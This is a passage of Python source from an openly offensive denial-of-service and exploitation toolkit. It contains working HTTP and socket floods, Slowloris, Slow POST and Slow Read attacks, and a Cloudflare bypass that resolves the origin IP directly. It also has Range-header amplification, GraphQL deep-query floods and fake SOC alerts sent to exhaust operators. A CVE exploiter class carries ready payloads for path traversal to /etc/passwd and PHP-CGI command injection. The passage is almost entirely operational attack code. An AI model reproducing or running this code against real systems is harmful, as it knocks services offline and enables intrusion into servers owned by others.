            elif extra.get("__null__"): headers["User-Agent"] = ""
            elif extra.get("__min__"): headers = {"User-Agent": ua, "Host": self.original_host or ""}
            elif extra.get("__hulk__"):
                headers["User-Agent"] = random.choice(GOOGLEBOT_AGENTS + CURL_IMPERSONATE)
                headers["Referer"] = f"https://{self.original_host}/" if self.original_host else "https://google.com/"
                headers["Cache-Control"] = "no-cache"
            elif extra.get("__golden__"):
                headers["Cache-Control"] = "no-cache"; headers["Pragma"] = "no-cache"
            elif extra.get("__brotli__"):
                headers["Accept-Encoding"] = "br"; headers["Cache-Control"] = "no-cache"
            elif extra.get("__jumbo__"): headers["Content-Length"] = "9000"
            if self.browser_cookie_str and random.random() > 0.5:
                headers["Cookie"] = self.browser_cookie_str
            proxy_str = f"{proxy['type']}://{proxy['ip']}:{proxy['port']}" if proxy else None
            proxies = {"http": proxy_str, "https": proxy_str} if proxy_str else None
            with self.lock: self.method_counts[method] += 1
            if method in ("FOO", "BAR"):
                r = session.request(method, url, headers=headers, proxies=proxies, timeout=10, verify=False)
            elif method == "HEAD": r = session.head(url, headers=headers, proxies=proxies, timeout=10, verify=False)
            elif method == "POST": r = session.post(url, data=body, headers=headers, proxies=proxies, timeout=10, verify=False)
            elif method == "PUT": r = session.put(url, data=body, headers=headers, proxies=proxies, timeout=10, verify=False)
            elif method == "PATCH": r = session.patch(url, data=body, headers=headers, proxies=proxies, timeout=10, verify=False)
            elif method == "DELETE": r = session.delete(url, headers=headers, proxies=proxies, timeout=10, verify=False)
            elif method == "OPTIONS": r = session.options(url, headers=headers, proxies=proxies, timeout=10, verify=False)
            elif method in ("STRESS", "SLOW", "XMLRPC", "BOMB", "APACHE", "BROTLI", "JUMBO"):
                r = session.post(url, data=body, headers=headers, proxies=proxies, timeout=10, verify=False)
            else: r = session.get(url, headers=headers, proxies=proxies, timeout=10, verify=False)
            _ = r.content
            with self.lock:
                self.requests_sent += 1
                if self.adaptive_limiter: self.adaptive_limiter.record_success()
        except Exception as e:
            msg = str(e).lower()
            with self.lock:
                et = type(e).__name__
                self.error_types[et] += 1
                if "timeout" in msg: self.timeouts += 1; self.last_error = "timeout"
                else: self.curl_errors += 1; self.last_error = et[:40]
                self.error_count += 1
                if self.adaptive_limiter: self.adaptive_limiter.record_error(et)
            if proxy and not self.args.no_proxy and self.proxy_mgr:
                self.proxy_mgr.mark_dead(proxy)

    def _worker(self, tid):
        time.sleep(random.uniform(0.01, 0.1))
        imp = random.choice(CURL_IMPERSONATE)
        session = self._create_session(imp)
        self._thread_local.session = session
        self._session_pool.append(session)
        while not self.thread_stop.is_set() and not self.stop_event.is_set():
            # v65.1: توقف workerهای اضافی
            if tid >= self.adaptive_executor.get_target():
                return
            if _resource_gate.is_paused():
                time.sleep(2.0)
                continue
            if self.net_health and self.net_health.is_paused():
                time.sleep(1.0)
                continue
            if self.adaptive_limiter:
                wait = 0.0001
                while not self.adaptive_limiter.consume(1):
                    if self.thread_stop.is_set() or self.stop_event.is_set(): return
                    time.sleep(wait); wait = min(wait * 1.5, 0.01)
            elif self.rate_limiter:
                wait = 0.0001
                while not self.rate_limiter.consume(1):
                    if self.thread_stop.is_set() or self.stop_event.is_set(): return
                    time.sleep(wait); wait = min(wait * 1.5, 0.01)
            self._do_one(self._thread_local.session, imp)
            if not self.brute:
                delay = max(0.0005, random.gauss(self.delay_min if self.delay_max == 0 else (self.delay_min + self.delay_max) / 2, 0.001))
                time.sleep(delay)
            if random.random() < 0.01:
                try: self._thread_local.session.close()
                except Exception: pass
                imp = random.choice(CURL_IMPERSONATE)
                self._thread_local.session = self._create_session(imp)
                self._session_pool.append(self._thread_local.session)

    async def attack(self):
        mode = "LiteSpeed-limited" if self.litespeed_mode else "standard"
        if self.brute: mode += " + BRUTE"
        logger.info(f"HTTP Flood - {self._n_threads} threads ({mode}) | delay {self.delay_min}-{self.delay_max}s")
        futures = [self.adaptive_executor.submit(self._worker, i) for i in range(self._n_threads)]
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            await asyncio.sleep(0.5)
        self.thread_stop.set()
        for f in futures:
            try: f.cancel()
            except Exception: pass
        for s in self._session_pool:
            try: s.close()
            except Exception: pass
        try: self.adaptive_executor.shutdown(wait=False)
        except Exception: pass

    async def close(self):
        try: self.adaptive_executor.shutdown(wait=False)
        except Exception: pass

# ============================================================================
# CFB Attack — v65.1
# ============================================================================
class CFBAttack:
    def __init__(self, target_url, stop_event, thread_stop, args, proxy_mgr=None):
        self.target_url = target_url
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.proxy_mgr = proxy_mgr
        self.requests_sent = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = threading.Lock()
        self._executor = ThreadPoolExecutor(max_workers=20, thread_name_prefix="cfb")
    async def attack(self):
        if not CURL_CFFI_AVAILABLE:
            self.last_error = "no_curl_cffi"; logger.warning("CFB - skipped (curl_cffi not installed)"); return
        logger.info("CFB (Cloudflare Bypass) - active (curl_cffi)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        except Exception: pass
    def _flood(self):
        fp = get_extra_fp_dict("chrome136")
        kwargs = {"impersonate": "chrome136"}
        if fp: kwargs["extra_fp"] = fp
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            with self.lock: self.attempts += 1
            try:
                s = curl_requests.Session(**kwargs)
                try: s.curl.setopt(CurlOpt.HTTP2_PSEUDO_HEADERS_ORDER, "masp")
                except Exception: pass
                r = s.get(self.target_url, timeout=10, verify=False, allow_redirects=True)
                if r.status_code == 200:
                    with self.lock: self.requests_sent += 1
                s.close()
            except Exception as e:
                with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                time.sleep(0.01)

# ============================================================================
# Slowloris / Slow POST / Slow Read — v65.1
# ============================================================================
class SlowlorisAttack:
    def __init__(self, host, port, max_conn, stop_event, thread_stop, args, use_ssl=False, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.max = min(max_conn, 150)
        self.active = 0; self.total = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock()
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.use_ssl = use_ssl
        self.original_host = original_host or host
        self.global_sem = global_sem
        self._tasks = set(); self._ssl_ctx = None
    def _ctx(self):
        if self._ssl_ctx is None:
            c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
            self._ssl_ctx = c
        return self._ssl_ctx
    async def attack(self):
        logger.info(f"Slowloris - {self.max} conns")
        for _ in range(min(50, self.max)):
            t = asyncio.create_task(self._conn()); self._tasks.add(t); t.add_done_callback(self._tasks.discard)
            await asyncio.sleep(0.02)
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            await asyncio.sleep(10)
            async with self.lock: a = self.active
            if a < self.max * 0.4:
                for _ in range(min(25, self.max - a)):
                    t = asyncio.create_task(self._conn()); self._tasks.add(t); t.add_done_callback(self._tasks.discard)
                    await asyncio.sleep(0.02)
    async def _conn(self):
        sem = self.global_sem
        if sem: await sem.acquire()
        try:
            async with self.lock: self.attempts += 1
            if self.use_ssl:
                r, w = await asyncio.wait_for(asyncio.open_connection(self.host, self.port, ssl=self._ctx(),
                                                                      server_hostname=self.original_host), timeout=5)
            else:
                r, w = await asyncio.wait_for(asyncio.open_connection(self.host, self.port), timeout=5)
            path = f"/{random.randint(1, 999999)}"
            headers = [f"Host: {self.original_host}", f"Content-Length: {random.randint(1000000, 10000000)}",
                       f"User-Agent: {FastUAGenerator().random()}", "Connection: keep-alive"]
            w.write((f"POST {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n").encode()); await w.drain()
            w.write((f"GET {path} HTTP/1.1\r\nHost: {self.original_host}\r\nContent-Length: 1000000\r\n\r\n").encode()); await w.drain()
            async with self.lock: self.active += 1; self.total += 1
            while not self.stop_event.is_set() and not self.thread_stop.is_set():
                try:
                    w.write(f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n".encode()); await w.drain()
                    await asyncio.sleep(random.uniform(10, 30))
                except Exception: break
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        except Exception as e:
            async with self.lock:
                self.last_error = type(e).__name__[:40]; self.error_count += 1
        finally:
            if sem:
                try: sem.release()
                except Exception: pass
            async with self.lock:
                if self.active > 0: self.active -= 1
            if not self.stop_event.is_set() and not self.thread_stop.is_set():
                t = asyncio.create_task(self._conn()); self._tasks.add(t); t.add_done_callback(self._tasks.discard)

class SlowPostAttack:
    def __init__(self, host, port, max_conn, stop_event, thread_stop, args, use_ssl=False, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.max = min(max_conn, 100)
        self.active = 0; self.total = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock()
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.use_ssl = use_ssl
        self.original_host = original_host or host
        self.global_sem = global_sem
        self._tasks = set(); self._ssl_ctx = None
    def _ctx(self):
        if self._ssl_ctx is None:
            c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
            self._ssl_ctx = c
        return self._ssl_ctx
    async def attack(self):
        logger.info(f"Slow POST - {self.max} conns")
        for _ in range(min(50, self.max)):
            t = asyncio.create_task(self._conn()); self._tasks.add(t); t.add_done_callback(self._tasks.discard)
            await asyncio.sleep(0.02)
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            await asyncio.sleep(10)
    async def _conn(self):
        sem = self.global_sem
        if sem: await sem.acquire()
        try:
            async with self.lock: self.attempts += 1
            if self.use_ssl:
                r, w = await asyncio.wait_for(asyncio.open_connection(self.host, self.port, ssl=self._ctx(),
                                                                      server_hostname=self.original_host), timeout=5)
            else:
                r, w = await asyncio.wait_for(asyncio.open_connection(self.host, self.port), timeout=5)
            cl = random.randint(10_000_000, 50_000_000)
            header = (f"POST /{random.randint(1, 999999)} HTTP/1.1\r\nHost: {self.original_host}\r\n"
                      f"Content-Length: {cl}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                      f"User-Agent: {FastUAGenerator().random()}\r\nConnection: keep-alive\r\n\r\n")
            w.write(header.encode()); await w.drain()
            async with self.lock: self.active += 1; self.total += 1
            sent = 0
            while sent < cl and not self.stop_event.is_set():
                w.write(b"X"); await w.drain()
                sent += 1
                await asyncio.sleep(random.uniform(10, 20))
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        except Exception as e:
            async with self.lock:
                self.last_error = type(e).__name__[:40]; self.error_count += 1
        finally:
            if sem:
                try: sem.release()
                except Exception: pass
            async with self.lock:
                if self.active > 0: self.active -= 1
            if not self.stop_event.is_set() and not self.thread_stop.is_set():
                t = asyncio.create_task(self._conn()); self._tasks.add(t); t.add_done_callback(self._tasks.discard)

class SlowReadAttack:
    """v65.1: Platform-aware. On Windows uses asyncio.open_connection directly."""
    def __init__(self, host, port, max_conn, stop_event, thread_stop, args, use_ssl=False, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.max = min(max_conn, 100)
        self.active = 0; self.total = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock()
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.use_ssl = use_ssl
        self.original_host = original_host or host
        self.global_sem = global_sem
        self._tasks = set(); self._ssl_ctx = None
    def _ctx(self):
        if self._ssl_ctx is None:
            c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
            self._ssl_ctx = c
        return self._ssl_ctx
    async def attack(self):
        logger.info(f"Slow Read - {self.max} conns (platform={PLATFORM_NAME})")
        for _ in range(min(50, self.max)):
            t = asyncio.create_task(self._conn()); self._tasks.add(t); t.add_done_callback(self._tasks.discard)
            await asyncio.sleep(0.02)
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            await asyncio.sleep(10)
    async def _conn(self):
        sem = self.global_sem
        if sem: await sem.acquire()
        sock = None
        try:
            async with self.lock: self.attempts += 1
            if self.use_ssl:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(self.host, self.port, ssl=self._ctx(),
                                            server_hostname=self.original_host), timeout=5)
            else:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(self.host, self.port), timeout=5)
            w.write((f"GET /{random.randint(1, 999999)} HTTP/1.1\r\nHost: {self.original_host}\r\nUser-Agent: {FastUAGenerator().random()}\r\n\r\n").encode())
            await w.drain()
            async with self.lock: self.active += 1; self.total += 1
            while not self.stop_event.is_set() and not self.thread_stop.is_set():
                try:
                    data = await asyncio.wait_for(r.read(1), timeout=5)
                    if not data: break
                except asyncio.TimeoutError: pass
                await asyncio.sleep(random.uniform(10, 20))
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        except Exception as e:
            async with self.lock:
                self.last_error = type(e).__name__[:40]; self.error_count += 1
        finally:
            if sem:
                try: sem.release()
                except Exception: pass
            async with self.lock:
                if self.active > 0: self.active -= 1
            if not self.stop_event.is_set() and not self.thread_stop.is_set():
                t = asyncio.create_task(self._conn()); self._tasks.add(t); t.add_done_callback(self._tasks.discard)

class SocketFloodAttack:
    def __init__(self, host, port, rate, stop_event, thread_stop, args, rate_limiter=None, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.rate = min(rate, 8000)
        self.packets = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock()
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.rate_limiter = rate_limiter
        self.original_host = original_host or host
        self.global_sem = global_sem
    async def attack(self):
        logger.info(f"Socket Flood - {self.rate}/s")
        workers = min(50, max(10, self.rate // 100))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            if self.rate_limiter: await self.rate_limiter.acquire(1)
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                reader, writer = await asyncio.wait_for(asyncio.open_connection(self.host, self.port), timeout=3)
                for _ in range(random.randint(5, 20)):
                    writer.write(b"X" * random.choice([64, 128, 256, 512, 1024]))
                    await writer.drain()
                    async with self.lock: self.packets += 1
                    await asyncio.sleep(random.uniform(0.0001, 0.005))
                writer.close()
                try: await writer.wait_closed()
                except Exception: pass
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                await asyncio.sleep(random.uniform(0.01, 0.05))
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class RangeAmpAttack:
    def __init__(self, target_url, stop_event, thread_stop, args, rate_limiter=None, original_host=None, global_sem=None, origin_ip=None, origin_port=None):
        self.target_url = target_url
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.rate_limiter = rate_limiter
        self.original_host = original_host; self.global_sem = global_sem
        self.origin_ip = origin_ip; self.origin_port = origin_port or 443
        self.requests_sent = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = threading.Lock()
        self._executor = None
        self._use_curl = CURL_CFFI_AVAILABLE
        self._curl_failures = 0
    async def attack(self):
        logger.info("RangeAmp - active (v65.1)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        except Exception: pass
    def _flood(self):
        workers = min(8, max(3, (self.args.workers or 200) // 30))
        for _ in range(workers):
            threading.Thread(target=self._worker, daemon=True).start()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            time.sleep(0.5)
    def _worker(self):
        time.sleep(random.uniform(0.05, 0.3))
        session = None
        try:
            if self._use_curl and CURL_CFFI_AVAILABLE:
                imp = random.choice(["chrome136", "chrome120", "chrome116"])
                session = self._create_session(imp)
        except Exception:
            session = None; self._use_curl = False
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            if self.rate_limiter and not self.rate_limiter.consume(1):
                time.sleep(0.001); continue
            with self.lock: self.attempts += 1
            try:
                if random.random() > 0.5:
                    ranges = ",".join(f"{i}-{i+1}" for i in range(0, 100, 1))
                else:
                    ranges = ",".join(f"{i}-{i+5000000}" for i in range(0, 50000000, 1000))
                headers = {"Range": f"bytes={ranges}", "User-Agent": FastUAGenerator().random()}
                if self.original_host: headers["Host"] = self.original_host
                if session is not None and self._use_curl:
                    try: r = session.get(self.target_url, headers=headers, timeout=10, verify=False)
                    except Exception:
                        self._curl_failures += 1
                        if self._curl_failures > 200: self._use_curl = False
                        r = requests.get(self.target_url, headers=headers, timeout=10, verify=False)
                else:
                    r = requests.get(self.target_url, headers=headers, timeout=10, verify=False)
                _ = r.content
                with self.lock: self.requests_sent += 1
            except Exception as e:
                with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                time.sleep(0.01)
        if session is not None:
            try: session.close()
            except Exception: pass
    def _create_session(self, imp):
        fp = get_extra_fp_dict(imp)
        kwargs = {"impersonate": imp}
        if fp: kwargs["extra_fp"] = fp
        s = curl_requests.Session(**kwargs)
        try: s.curl.setopt(CurlOpt.HTTP2_PSEUDO_HEADERS_ORDER, "masp")
        except Exception: pass
        if self.origin_ip and self.original_host:
            try:
                s.curl.setopt(CurlOpt.RESOLVE, [f"{self.original_host}:{self.origin_port}:{self.origin_ip}"])
                s.curl.setopt(CurlOpt.SSL_VERIFYHOST, 0); s.curl.setopt(CurlOpt.SSL_VERIFYPEER, 0)
            except Exception: pass
        return s

class HammerAttack:
    BOT_SERVICES = [
        "http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u=",
        "http://twitter.com/intent/tweet?url=", "http://www.reddit.com/submit?url=",
    ]
    RAW_UAS = ["Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0"]
    DEFAULT_HEADERS = ("Accept: text/html,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nConnection: keep-alive\r\n")
    def __init__(self, host, port, stop_event, thread_stop, args, turbo=40,
                 rate_limiter=None, original_host=None, headers_file=None, use_https=False):
        self.host = host; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.turbo = turbo
        self.rate_limiter = rate_limiter; self.original_host = original_host
        self.use_https = use_https
        self.raw_packets = 0; self.bot_requests = 0
        self.attempts = 0; self.last_error = ""; self.error_count = 0
        self.lock = threading.Lock()
        self._executor = None
        self._headers = self.DEFAULT_HEADERS
    async def attack(self):
        logger.info(f"Hammer - {self.turbo} threads (v65.1)")
        for _ in range(self.turbo): self._executor.submit(self._raw_worker)
        for _ in range(min(4, self.turbo // 10)): self._executor.submit(self._bot_worker)
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            await asyncio.sleep(5)
    def _raw_worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            if self.rate_limiter: self.rate_limiter.consume(1)
            with self.lock: self.attempts += 1
            try:
                ua = random.choice(self.RAW_UAS)
                packet = (f"GET / HTTP/1.1\r\nHost: {self.original_host or self.host}\r\n"
                          f"User-Agent: {ua}\r\n{self._headers}\r\n").encode()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
                s.connect((self.host, int(self.port))); s.sendall(packet)
                try: s.shutdown(socket.SHUT_WR)
                except Exception: pass
                with self.lock: self.raw_packets += 1
                s.close()
                time.sleep(random.uniform(0.001, 0.01))
            except Exception as e:
                with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                time.sleep(random.uniform(0.01, 0.05))
    def _bot_worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            try:
                bot_url = random.choice(self.BOT_SERVICES)
                target_url = f"http://{self.original_host or self.host}/"
                try:
                    requests.get(bot_url + target_url, headers={"User-Agent": FastUAGenerator().random()},
                                 timeout=5, verify=False, allow_redirects=False)
                except Exception: pass
                with self.lock: self.bot_requests += 1
                time.sleep(random.uniform(0.05, 0.2))
            except Exception: time.sleep(0.1)

class CVEExploiter:
    CVES = {
        "CVE-2021-41773": {"payload": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "method": "GET"},
        "CVE-2024-4577": {"payload": "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "method": "POST", "body": "<?php system('whoami'); ?>"},
        "CVE-2024-23897": {"payload": "/cli?remoting=false", "method": "POST", "headers": {"Session": "", "Side": "download"}, "body": "@{/etc/passwd}"},
        "CVE-2025-24813": {"payload": "/test/session", "method": "PUT", "body": b"test", "headers": {"Content-Range": "bytes 0-3/4"}},
        "CVE-2025-29927": {"payload": "/", "method": "GET", "headers": {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}},
        "CVE-2022-0073": {"payload": "/admin/", "method": "POST", "body": "cmd=id"},
        "CVE-2022-0074": {"payload": "/admin/login.php", "method": "POST", "body": "user=admin&pass=admin"},
        "CVE-2023-28432": {"payload": "/admin/status", "method": "GET"},
    }
    def __init__(self, target_url, stop_event, thread_stop, args, original_host=None, origin_ip=None, origin_port=None):
        self.target_url = target_url
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host
        self.origin_ip = origin_ip; self.origin_port = origin_port or 443
        self.results = []; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = threading.Lock()
    async def attack(self):
        logger.info("CVE Exploiter - testing 8 CVEs")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(None, self._run_sync)
        except Exception as e: logger.warning(f"CVE failed: {e}")
    def _run_sync(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        for cve_id, data in self.CVES.items():
            if self.stop_event.is_set(): break
            with self.lock: self.attempts += 1
            try:
                p = urlparse(self.target_url)
                base = f"{p.scheme}://{p.hostname}" + (f":{p.port}" if p.port else "")
                url = base + data["payload"]
                headers = {"User-Agent": FastUAGenerator().random()}
                if "headers" in data: headers.update(data["headers"])
                if self.original_host: headers["Host"] = self.original_host
                method = data.get("method", "GET"); body = data.get("body")
                if CURL_CFFI_AVAILABLE and self.origin_ip and self.original_host:
                    fp = get_extra_fp_dict("chrome136")
                    kwargs = {"impersonate": "chrome136"}
                    if fp: kwargs["extra_fp"] = fp
                    s = curl_requests.Session(**kwargs)
                    try:
                        s.curl.setopt(CurlOpt.RESOLVE, [f"{self.original_host}:{self.origin_port}:{self.origin_ip}"])
                        s.curl.setopt(CurlOpt.SSL_VERIFYHOST, 0); s.curl.setopt(CurlOpt.SSL_VERIFYPEER, 0)
                    except Exception: pass
                    r = s.request(method, url, headers=headers, data=body, timeout=10, verify=False)
                else:
                    if method == "POST": r = requests.post(url, headers=headers, data=body, timeout=10, verify=False)
                    elif method == "PUT": r = requests.put(url, headers=headers, data=body, timeout=10, verify=False)
                    else: r = requests.get(url, headers=headers, timeout=10, verify=False)
                status = r.status_code; vuln = False
                if cve_id == "CVE-2021-41773" and "root:" in r.text: vuln = True
                elif cve_id == "CVE-2024-4577" and "uid=" in r.text: vuln = True
                elif cve_id == "CVE-2024-23897" and "root:" in r.text: vuln = True
                elif cve_id == "CVE-2025-24813" and status in (201, 204): vuln = True
                elif cve_id == "CVE-2025-29927" and status == 200 and "login" not in r.text.lower(): vuln = True
                elif cve_id == "CVE-2022-0073" and "uid=" in r.text: vuln = True
                elif cve_id == "CVE-2022-0074" and status == 200 and "logout" in r.text.lower(): vuln = True
                elif cve_id == "CVE-2023-28432" and "litespeed" in r.text.lower(): vuln = True
                with self.lock: self.results.append({"cve": cve_id, "status": status, "vulnerable": vuln})
                if vuln: logger.warning(f"   {cve_id} VULNERABLE")
                else: logger.info(f"   {cve_id} safe (status={status})")
            except Exception as e:
                with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1

class OperatorFatigueAttack:
    ALERTS = [("CRITICAL", "SQL Injection"), ("HIGH", "Failed SSH"), ("MEDIUM", "Port scan")]
    ENDPOINTS = ["/api/alerts", "/siem/ingest"]
    def __init__(self, target_url, stop_event, thread_stop, args, original_host=None):
        self.target_url = target_url
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host
        self.alerts_sent = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = threading.Lock(); self._loop = None
    async def attack(self):
        logger.info("Operator Fatigue - active")
        self._loop = asyncio.get_running_loop()
        workers = min(5, max(1, (self.args.workers or 200) // 60))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        p = urlparse(self.target_url)
        base = f"{p.scheme}://{p.hostname}" + (f":{p.port}" if p.port else "")
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            with self.lock: self.attempts += 1
            try:
                sev, msg = random.choice(self.ALERTS)
                url = base + random.choice(self.ENDPOINTS)
                headers = {"User-Agent": FastUAGenerator().random(), "X-SOC-Alert": sev,
                           "X-SIEM-Source": "splunk", "Content-Type": "application/json"}
                if self.original_host: headers["Host"] = self.original_host
                def _send():
                    try: requests.post(url, headers=headers, json={"a": sev, "m": msg}, timeout=5, verify=False)
                    except Exception: pass
                await self._loop.run_in_executor(None, _send)
                with self.lock: self.alerts_sent += 1
                await asyncio.sleep(random.uniform(0.5, 2))
            except Exception as e:
                with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                await asyncio.sleep(1)

class GraphQLDeepQueryAttack:
    DEEP = '{"query":"query { __schema { types { name kind fields { name type { name kind ofType { name kind ofType { name kind ofType { name } } } } } } } }"}'  # noqa
    BATCH = '[' + ','.join(['{"query":"{__typename}"}'] * 50) + ']'
    def __init__(self, target_url, stop_event, thread_stop, args, original_host=None, origin_ip=None, origin_port=None):
        self.target_url = target_url
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host
        self.origin_ip = origin_ip; self.origin_port = origin_port or 443
        self.queries_sent = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = threading.Lock(); self._loop = None
        self._discovered = []
    async def attack(self):
        logger.info("GraphQL - active")
        self._loop = asyncio.get_running_loop()
        # v65.1: discovery غیرمسدودکننده
        discovery_task = asyncio.create_task(self._discover())
        await asyncio.sleep(2)
        if not self._discovered:
            self._discovered = DEFAULT_GRAPHQL_FALLBACK[:]
            logger.info(f"   [graphql] fallback → {self._discovered}")
        workers = min(10, max(2, (self.args.workers or 200) // 40))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _discover(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        p = urlparse(self.target_url)
        base = f"{p.scheme}://{p.hostname}" + (f":{p.port}" if p.port else "")
        loop = asyncio.get_running_loop()
        def _probe(url):
            try:
                if CURL_CFFI_AVAILABLE and self.origin_ip and self.original_host:
                    fp = get_extra_fp_dict("chrome136")
                    kwargs = {"impersonate": "chrome136"}
                    if fp: kwargs["extra_fp"] = fp
                    s = curl_requests.Session(**kwargs)
                    try:
                        s.curl.setopt(CurlOpt.RESOLVE, [f"{self.original_host}:{self.origin_port}:{self.origin_ip}"])
                        s.curl.setopt(CurlOpt.SSL_VERIFYHOST, 0); s.curl.setopt(CurlOpt.SSL_VERIFYPEER, 0)
                    except Exception: pass
                    r = s.post(url, json={"query": "{__typename}"},
                               headers={"User-Agent": FastUAGenerator().random()},
                               timeout=5, verify=False)
                    return r.status_code, r.text[:400]
                else:
                    r = requests.post(url, json={"query": "{__typename}"},
                                      headers={"Content-Type": "application/json", "User-Agent": FastUAGenerator().random()},
                                      timeout=5, verify=False)
                    return r.status_code, r.text[:400]
            except Exception: return None, ""
        for ep in GRAPHQL_ENDPOINTS:
            if self.stop_event.is_set(): break
            try:
                status, text = await loop.run_in_executor(None, _probe, base + ep)
                if status in (200, 400, 404, 405) and (len(text) > 10):
                    self._discovered.append(ep)
                    logger.info(f"   [graphql] {ep}")
            except Exception: continue
    async def _worker(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        p = urlparse(self.target_url)
        base = f"{p.scheme}://{p.hostname}" + (f":{p.port}" if p.port else "")
        eps = self._discovered or DEFAULT_GRAPHQL_FALLBACK[:]
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            with self.lock: self.attempts += 1
            try:
                url = base + random.choice(eps)
                payload = self.DEEP if random.random() > 0.5 else self.BATCH
                headers = {"User-Agent": FastUAGenerator().random(), "Content-Type": "application/json"}
                if self.original_host: headers["Host"] = self.original_host
                def _send():
                    try: return requests.post(url, headers=headers, data=payload, timeout=8, verify=False).status_code
                    except Exception: return None
                status = await self._loop.run_in_executor(None, _send)
                if status in (200, 400, 404, 500):
                    with self.lock: self.queries_sent += 1
                await asyncio.sleep(random.uniform(0.05, 0.3))
            except Exception as e:
                with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                await asyncio.sleep(0.5)

class WebSocketAmplificationAttack:
    def __init__(self, host, port, stop_event, thread_stop, args, rate_limiter=None, original_host=None, use_ssl=False, global_sem=None):
        self.host = host; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args
        self.requests_sent = 0; self.attempts = 0; self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock(); self.rate_limiter = rate_limiter
        self.original_host = original_host or host
        self.use_ssl = use_ssl; self.global_sem = global_sem; self._ssl_ctx = None
    def _ctx(self):
        if self._ssl_ctx is None:
            c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
            self._ssl_ctx = c
        return self._ssl_ctx
    async def attack(self):
        logger.info("WebSocket - active")
        workers = min(8, max(2, (self.args.workers or 200) // 50))
